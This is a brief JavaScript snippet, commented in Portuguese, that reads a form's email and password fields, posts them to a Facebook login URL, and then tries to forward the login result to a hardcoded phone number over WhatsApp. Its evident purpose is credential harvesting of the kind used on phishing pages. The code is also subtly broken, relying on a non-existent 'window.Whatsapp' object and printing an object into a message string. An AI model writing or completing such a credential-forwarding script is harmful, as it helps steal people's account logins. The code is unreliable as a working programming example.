function enviarLogin() {
  const email = document.querySelector("input[name='email']").value;
  const senha = document.querySelector("input[name='senha']").value;

  const dados = {
    email,
    senha,
  };

  const xhr = new XMLHttpRequest();
  xhr.open("POST", "https://api.facebook.com/login");
  xhr.setRequestHeader("Content-Type", "application/json");
  xhr.send(JSON.stringify(dados));

  xhr.onload = function() {
    if (xhr.status === 200) {
      const login = JSON.parse(xhr.responseText);
      console.log(login);

      // Envia o login para o WhatsApp
      const whatsapp = new window.Whatsapp();
      whatsapp.sendMessage("+55 21 959174148", `Olá, seu login do Facebook é: ${login}`);
    } else {
      console.log("Erro ao fazer login: " + xhr.status);
    }
  };
}

document.querySelector("button").addEventListener("click", enviarLogin);
